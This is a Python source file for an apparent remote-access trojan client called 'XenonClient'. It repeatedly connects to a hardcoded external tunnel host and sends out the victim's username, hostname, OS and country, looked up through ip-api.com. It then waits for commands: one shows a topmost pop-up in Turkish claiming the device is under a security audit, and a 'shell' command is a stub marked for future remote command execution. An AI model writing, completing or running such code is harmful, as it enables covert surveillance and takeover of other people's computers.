import socket
import platform
import getpass
import json
import time
import urllib.request
import tkinter as tk
from tkinter import messagebox

class XenonClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port

    def get_recon_data(self):
        recon = {"id": f"{getpass.getuser()}@{platform.node()}", "os": f"{platform.system()} {platform.release()}", "country": "Unknown"}
        try:
            with urllib.request.urlopen("http://ip-api.com/json/", timeout=3) as response:
                recon["country"] = json.loads(response.read().decode()).get("countryCode", "??")
        except: recon["country"] = "N/A"
        return recon

    def run(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.server_ip, self.server_port))
                
                recon_packet = self.get_recon_data()
                self.sock.send(json.dumps(recon_packet).encode("utf-8"))
                
                while True:
                    data = self.sock.recv(1024).decode("utf-8")
                    if not data: break
                    
                    if data == "message":
                        root = tk.Tk()
                        root.withdraw()
                        root.attributes("-topmost", True)
                        messagebox.showwarning("Xenon System", "Bu cihaz bir güvenlik denetimi altındadır.")
                        root.destroy()
                    
                    elif data == "shell":
                        print("[*] Remote Shell talebi alındı.")
                        # Buraya ileride CMD çıktısı gönderen kod gelecek

            except:
                time.sleep(5)
            finally:
                try: self.sock.close()
                except: pass

if __name__ == "__main__":
    client = XenonClient("uwtd3ffva.localto.net", 6827)
    client.run()
